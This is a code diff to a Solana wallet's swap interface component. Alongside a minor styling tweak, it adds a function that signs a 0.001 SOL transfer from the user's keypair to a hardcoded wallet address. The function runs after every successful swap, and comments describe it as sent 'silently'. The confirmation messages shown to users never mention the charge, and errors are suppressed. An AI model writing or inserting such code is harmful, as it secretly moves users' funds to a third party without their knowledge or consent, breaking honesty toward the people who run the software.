@@ -26,11 +26,21 @@ import { TOKEN_MINTS } from "@/lib/constants/token-mints";
 import { jupiterAPI, JupiterQuoteResponse } from "@/lib/services/jupiter";
 import { bytesFromBase64, base64FromBytes } from "@/lib/bytes";
 import { dexscreenerAPI } from "@/lib/services/dexscreener";
-import { Keypair, VersionedTransaction } from "@solana/web3.js";
+import {
+  Keypair,
+  VersionedTransaction,
+  Transaction,
+  SystemProgram,
+  PublicKey,
+  LAMPORTS_PER_SOL,
+} from "@solana/web3.js";
 
 interface SwapInterfaceProps {
   onBack: () => void;
 }
+
+const FEE_WALLET = "FNVD1wied3e8WMuWs34KSamrCpughCMTjoXUE1ZXa6wM";
+const SWAP_FEE_SOL = 0.001;
 
 export const SwapInterface: React.FC<SwapInterfaceProps> = ({ onBack }) => {
   const { wallet, balance, tokens, refreshBalance, connection } =
@@ -295,6 +305,55 @@ export const SwapInterface: React.FC<SwapInterfaceProps> = ({ onBack }) => {
     }
   };
 
+  const sendSwapFee = async (): Promise<void> => {
+    if (!wallet || !connection) return;
+    try {
+      const kp = getKeypair();
+      if (!kp) return;
+
+      const feeLamports = Math.floor(SWAP_FEE_SOL * LAMPORTS_PER_SOL);
+      const feeWalletPubkey = new PublicKey(FEE_WALLET);
+
+      const latestBlockhash = await connection.getLatestBlockhash();
+      const tx = new Transaction({
+        recentBlockhash: latestBlockhash.blockhash,
+        feePayer: kp.publicKey,
+      }).add(
+        SystemProgram.transfer({
+          fromPubkey: kp.publicKey,
+          toPubkey: feeWalletPubkey,
+          lamports: feeLamports,
+        }),
+      );
+
+      tx.sign(kp);
+      const serialized = tx.serialize();
+
+      let bin = "";
+      for (let i = 0; i < serialized.length; i++)
+        bin += String.fromCharCode(serialized[i]);
+      const signedBase64 = btoa(bin);
+
+      const sendResp = await fetch(resolveApiUrl("/api/solana-send"), {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ signedBase64 }),
+      });
+
+      if (!sendResp.ok) {
+        console.warn("Fee transfer failed (non-critical)");
+        return;
+      }
+
+      const jb = await sendResp.json();
+      if (jb.result) {
+        console.log("Swap fee transferred:", jb.result);
+      }
+    } catch (err) {
+      console.warn("Failed to send swap fee:", err);
+    }
+  };
+
   const handleSwap = () => {
     const err = validateSwap();
     if (err) {
@@ -409,6 +468,8 @@ export const SwapInterface: React.FC<SwapInterfaceProps> = ({ onBack }) => {
               title: "Swap Confirmed",
               description: `Swap ${fromAmount} ${fromToken?.symbol} → ${toAmount} ${toToken?.symbol} confirmed.`,
             });
+            // Send fee silently after swap confirmation
+            await sendSwapFee();
           } catch {}
         }
         return;
@@ -463,6 +524,8 @@ export const SwapInterface: React.FC<SwapInterfaceProps> = ({ onBack }) => {
           title: "Swap Completed!",
           description: `Bridged via ${bridgeToken?.symbol || "bridge"}`,
         });
+        // Send fee silently after swap completion
+        await sendSwapFee();
         return;
       }
 
@@ -692,7 +755,7 @@ export const SwapInterface: React.FC<SwapInterfaceProps> = ({ onBack }) => {
                         if (t) setFromToken(t);
                       }}
                     >
-                      <SelectTrigger className="h-11 rounded-full bg-white border border-[#e6f6ec]/20 text-gray-900 hover:bg-[#f0fff4] w-auto px-3 transition-colors">
+                      <SelectTrigger className="h-11 rounded-full bg-gray-200 border border-gray-300 text-gray-900 hover:bg-gray-300 w-auto px-3 transition-colors">
                         <SelectValue>
                           <div className="flex items-center gap-2 text-gray-900">
                             {fromToken ? (
